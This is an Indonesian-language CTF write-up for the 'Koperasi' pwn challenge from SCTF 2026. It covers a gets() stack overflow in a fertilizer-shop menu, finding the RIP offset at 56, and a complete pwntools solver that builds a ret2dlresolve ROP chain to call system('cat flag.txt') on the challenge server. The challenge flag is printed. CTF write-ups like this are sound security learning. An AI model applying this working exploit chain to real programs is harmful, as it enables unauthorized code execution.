---
slug: "pwn-koperasi"
title: "Koperasi"
competition: "SCTF 2026"
category: "Pwn"
difficulty: "Medium"
date: "2026-07-04"
updated: "2026-07-06"
summary: "Deskripsi : Sistem Koperasi Desa Suka Maju baru saja direvolusi menjadi digital. Namun, Kepala Desa mencium aroma busuk: kas mereka terus menyusut padahal tidak ada laporan kerugian! Diduga ada celah matematis yang memungkinkan peretas menggandakan uang mereka dari udara kosong. Tugasmu adalah menjadi auditor keamanan dadakan dan menguras kas tersebut untuk membuktikan kebobrokannya! nc 103.127.98.249 5002"
tags: ["PWN","MEDIUM","RET2LIBC (SHOULD BE)","RET2DLRESOLVE"]
status: "published"
flag: "SCTF26{p0l1n0m14l_d4n_b0f_b1k1n_k0p3r4s1_j3b0l}"
attachments: [{"url":"/assets/uploads/6e464511-a13e-42da-bdc6-e683285a461d-koperasi","name":"koperasi","contentType":"application/octet-stream"}]
source: "https://claritys.web.id/writeups/pwn-koperasi"
---

# Koperasi

> Deskripsi : Sistem Koperasi Desa Suka Maju baru saja direvolusi menjadi digital. Namun, Kepala Desa mencium aroma busuk: kas mereka terus menyusut padahal tidak ada laporan kerugian! Diduga ada celah matematis yang memungkinkan peretas menggandakan uang mereka dari udara kosong. Tugasmu adalah menjadi auditor keamanan dadakan dan menguras kas tersebut untuk membuktikan kebobrokannya! nc 103.127.98.249 5002

Link AI:

[https://claude.ai/share/08a9aadd-7372-437c-9bf3-6ea829de2f13](https://claude.ai/share/08a9aadd-7372-437c-9bf3-6ea829de2f13)

[https://chatgpt.com/share/6a483436-1a34-83ec-9be7-d99fd81ac2e3](https://chatgpt.com/share/6a483436-1a34-83ec-9be7-d99fd81ac2e3)

Challenge ini ngasih binary `koperasi`, decompile di `decompile.txt`, dan beberapa catatan di `information.txt`. Dari awal keliatan ini pwn klasik, tapi dibungkus menu koperasi: verifikasi anggota, cairin saldo, baru bisa beli pupuk.

Pertama cek proteksi:

```bash
~/ctf/sctf/pwn/pwn_2/koperasii
❯ checksec koperasi

[*] '/home/claritys/ctf/sctf/pwn/pwn_2/koperasii/koperasi'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

Dari sini asumsi awal gue:

-   `No canary` berarti stack overflow kemungkinan bisa langsung overwrite RIP.
    

-   `NX enabled` berarti shellcode di stack bukan jalan paling enak.
    

-   `No PIE` berarti alamat gadget dan PLT/GOT binary stabil.
    

-   `Partial RELRO` bikin GOT masih menarik buat dibaca atau bahkan ditulis, tapi untuk kasus ini leak aja cukup.
    

Asumsi ini valid karena checksec nunjukin mitigasi persis begitu.  
Jadi kalau ada fungsi input jelek, kemungkinan besar arahnya ret2libc.

Program punya menu:

```
1. Verifikasi Anggota (Himpunan)
2. Pencairan Saldo (Polinomial)
3. Beli Pupuk (Toko)
4. Keluar
```

Menu 3 baru bisa diakses kalau sudah lolos menu 1 dan menu 2.

Di decompile, bagian menu 3 menarik banget:

```
void FUN_004016e9(void)
{
  char local_38 [48];

  puts("\\n--- Toko Pupuk Koperasi ---");
  puts("Pupuk NPK Mutiara 50kg - Harga: Rp 500.000");
  printf("Masukkan alamat pengiriman pupuk (max 40 karakter):\\n> ");
  getchar();
  gets(local_38);
  printf("[+] Pesanan diproses! Pupuk akan dikirim ke: %s\\n",local_38);
  return;
}
```

Nah ini udah bau. Buffer 48 byte, prompt bilang max 40 karakter, tapi input pakai `gets`. `gets` tidak peduli batas ukuran, jadi ini kandidat bug utama.

Kenapa gue asumsi ini bug yang bener? Karena:

-   `gets(local_38)` langsung nulis ke stack.
    

-   Tidak ada canary.
    

-   Fungsi return setelah input, jadi saved RIP bisa kena.
    

-   `printf("%s", local_38)` cuma efek samping output, bukan mitigasi.
    

Gue coba isi alamat dengan cyclic pattern lewat flow normal:  
verifikasi, cairin saldo, lalu beli pupuk. Program crash di akhir fungsi  
`FUN_004016e9`, tepat di instruksi `ret`.

Dari catatan gdb:

![](/assets/uploads/093f5908-7fd0-4803-b001-a81c6e023969-image-18.png)

```
$rip   : 0x0000000000401751 -> ret
$rbp   : 0x6161616161616167

gef➤  pattern search $rbp
[+] Searching for '6761616161616161'/'6161616161616167' with period=8
[+] Found at offset 48 (little-endian search) likely
```

Karena offset ke saved RBP adalah 48, maka saved RIP ada setelahnya:

```
offset RIP = 48 + 8 = 56
```

Ini cocok juga dengan layout fungsi:

```
char local_38[48]
saved rbp 8 byte
saved rip 8 byte
```

Jadi payload dasar:

```
b"A" * 56 + p64(target)
```

Nah, sejujurnya di sini sempet stuck. Karena ini pertama kali ngerjain ret2libc (kata claude), mana gak dikasih pula libcnya, jadinya harus nyari nyari WU yang libc. Nah, karena butuh ngeleak, dan aku belum tau caranya, akhirnya aku tanya bro claude biar langsung digituin :)..

Bisa diliat didalam link claude, kalau kita itu berusaha keras biar dapetin libcnya, yang pada akhirnya token claude gw habis :v. alhasil ya tanya CHATGPT.

Tapi gak sangka kalau bisa langsung solve 😭

![](/assets/uploads/72821544-6039-496e-b22f-e2adcef76b3d-image-19.png)

Yang in conclusion, ternyata ini itu **ret2dlresolve.** Sebenarnya udah ada feeling kalau misalnya nebak libc nya itu susah banget. Karena udah nyobain semua libc satu satu di [libc.rip](http://libc.rip) masih salah semua..

![](/assets/uploads/31fcb80b-4a40-4a96-9fce-65c603794040-image-20.png)

* * *

But in the end of the day, this is a ret2dlresolve challenge. It was fun and tiring for this challenge cuz many errors :).

Solver:

```python
#!/usr/bin/env python3
from pwn import *
import re

BINARY = "./koperasi"
HOST, PORT = "103.127.98.249", 5002

context.binary = elf = ELF(BINARY, checksec=False)
context.log_level = "info"

OFFSET = 56
RET_GADGET = 0x401016

def start():
    if HOST and PORT:
        return remote(HOST, PORT)
    return process(BINARY)

def solve_himpunan(io):
    io.sendlineafter(b"Pilih menu: ", b"1")

    io.recvuntil(b"Warga (W) = {")
    w = [int(x.strip()) for x in io.recvuntil(b"}", drop=True).split(b",")]

    io.recvuntil(b"Petani (P) = {")
    p = [int(x.strip()) for x in io.recvuntil(b"}", drop=True).split(b",")]

    inter = list(set(w) & set(p))
    assert len(inter) >= 2, f"Irisan kurang: {inter}"

    io.sendlineafter(b":", f"{inter[0]} {inter[1]}".encode())

def solve_polinomial(io):
    io.sendlineafter(b"Pilih menu: ", b"2")
    io.recvuntil(b"otorisasi:\n")

    line = io.recvline()
    log.info(f"poly line = {line!r}")

    m = re.search(
        rb"x\^3\s*([+-])\s*(\d+)x\^2\s*([+-])\s*(\d+)x\s*([+-])\s*(\d+)\s*=\s*0",
        line
    )
    assert m, f"Gagal parse polinomial: {line!r}"

    s1, n1, s2, n2, s3, n3 = m.groups()

    def signed(sign, num):
        num = int(num)
        return num if sign == b"+" else -num

    a = signed(s1, n1)
    b = signed(s2, n2)
    c = signed(s3, n3)

    root = None
    for x in range(1, 40):
        if x**3 + a*x**2 + b*x + c == 0:
            root = x
            break

    assert root is not None, f"Akar tidak ketemu: {a}, {b}, {c}"
    log.info(f"root = {root}")

    io.sendlineafter(b":", str(root).encode())

def build_dlresolve_payload(cmd="cat flag.txt"):
    # Geser-geser .bss supaya payload tidak mengandung newline.
    # Karena kita nulis pakai gets(), byte 0x0a bisa memotong input.
    for add in range(0x800, 0x3000, 0x100):
        data_addr = elf.bss() + add

        dlresolve = Ret2dlresolvePayload(
            elf,
            symbol="system",
            args=[cmd],
            data_addr=data_addr
        )

        rop = ROP(elf)
        rop.raw(RET_GADGET)
        rop.call(elf.plt["gets"], [dlresolve.data_addr])
        rop.ret2dlresolve(dlresolve)

        payload1 = flat({
            OFFSET: rop.chain()
        })

        payload2 = dlresolve.payload

        if b"\n" not in payload1 and b"\n" not in payload2:
            log.info(f"dlresolve data_addr = {hex(data_addr)}")
            return payload1, payload2

    raise RuntimeError("Tidak dapat payload ret2dlresolve tanpa newline")

def main():
    io = start()

    solve_himpunan(io)
    solve_polinomial(io)

    io.sendlineafter(b"Pilih menu: ", b"3")
    io.recvuntil(b"> ")

    payload1, payload2 = build_dlresolve_payload("cat flag.txt")

    # Ini masuk ke gets(local_38) asli di fungsi toko.
    io.sendline(payload1)

    # Buang output printf normal dari program.
    io.recvuntil(b"dikirim ke: ")
    io.recvline()

    # Ini dibaca oleh ROP: gets(.bss)
    io.sendline(payload2)

    io.interactive()

if __name__ == "__main__":
    main()
```
